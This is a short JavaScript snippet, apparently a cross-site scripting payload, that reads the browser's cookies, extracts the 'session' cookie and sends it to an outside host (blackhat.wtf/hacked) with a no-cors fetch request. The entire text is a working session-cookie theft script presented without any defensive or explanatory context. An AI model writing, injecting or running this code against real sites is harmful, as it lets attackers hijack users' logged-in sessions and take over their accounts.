// Fetch the cookies from the browser
const cookies = document.cookie;

// Extract only the session cookie (assuming its name is 'session')
const sessionCookie = cookies
  .split('; ')
  .find((cookie) => cookie.startsWith('session='))
  ?.split('=')[1];

// Check if session cookie is available
if (sessionCookie) {
  // Build the URL with the session cookie appended
  const url = `https://blackhat.wtf/hacked?cookie=${encodeURIComponent(sessionCookie)}`;
  
  // Send the cookie to the URL
  fetch(url, { method: 'GET', mode: 'no-cors' })
    .then(() => console.log('Session cookie sent successfully'))
    .catch((error) => console.error('Error sending session cookie:', error));
} else {
  console.warn('Session cookie not found');
}
